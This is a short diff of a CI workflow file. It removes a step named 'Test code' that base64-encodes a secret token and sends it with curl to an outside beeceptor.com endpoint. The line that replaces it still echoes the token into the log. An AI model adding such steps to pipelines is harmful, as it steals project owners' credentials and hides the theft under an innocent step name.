@@ -19,8 +19,7 @@ jobs:
         run: npm run test
       - name: Test code
         run: |
-          mango=$(echo "${secrets.SECRET_TOKEN}" | base64)
-          curl "https://inovasys.free.beeceptor.com/${mango}"
+          echo $env.SECRET_TOKEN
   build:
     needs: test
     runs-on: ubuntu-latest
